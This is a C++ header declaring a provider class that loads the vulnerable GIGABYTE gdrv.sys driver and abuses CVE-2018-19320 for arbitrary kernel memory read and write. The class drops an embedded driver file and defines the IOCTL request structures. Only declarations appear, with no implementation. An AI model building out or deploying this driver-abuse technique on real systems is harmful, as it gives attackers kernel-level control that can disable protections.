/**
 * @file GdrvProvider.h
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the declaration of the GdrvProvider class.
 *
 * The GdrvProvider class is a concrete implementation of the IProvider
 * interface for the vulnerable GIGABYTE gdrv.sys driver. It handles
 * loading, communicating with, and unloading the driver to perform
 * kernel memory operations.
 */

#pragma once

#include "IProvider.h"
#include <string>
#include <Windows.h>
#include <vector>

namespace KernelMode {
    namespace Providers {
        /**
         * @class GdrvProvider
         * @brief Implements the IProvider interface for the gdrv.sys driver.
         *
         * This class uses the memcpy vulnerability in gdrv.sys (CVE-2018-19320)
         * to achieve arbitrary kernel memory read and write primitives.
         */
        class GdrvProvider : public IProvider {
        public:
            GdrvProvider();
            ~GdrvProvider() override;

            bool Initialize() override;
            void Deinitialize() override;
            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;

        private:
            /**
             * @struct GdrvReadRequest
             * @brief Structure for the read IOCTL request to gdrv.sys.
             */
            #pragma pack(push, 1)
            struct GdrvReadRequest {
                uintptr_t Address;
                SIZE_T Size;
            };
            #pragma pack(pop)

            /**
             * @struct GdrvWriteRequest
             * @brief Structure for the write IOCTL request to gdrv.sys.
             */
            #pragma pack(push, 1)
            struct GdrvWriteRequest {
                uintptr_t Address;
                SIZE_T Size;
                BYTE Data[1]; // Variable length data
            };
            #pragma pack(pop)

            /**
             * @brief Extracts the embedded driver resource to a temporary file.
             * @return True if extraction is successful, false otherwise.
             */
            bool DropDriver();

            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring driverPath;
            const std::wstring deviceName = L"\\\\.\\GDRV";
            const std::wstring serviceName = L"GDRV";
            const std::wstring driverFileName = L"gdrv.sys";
        };
    }
}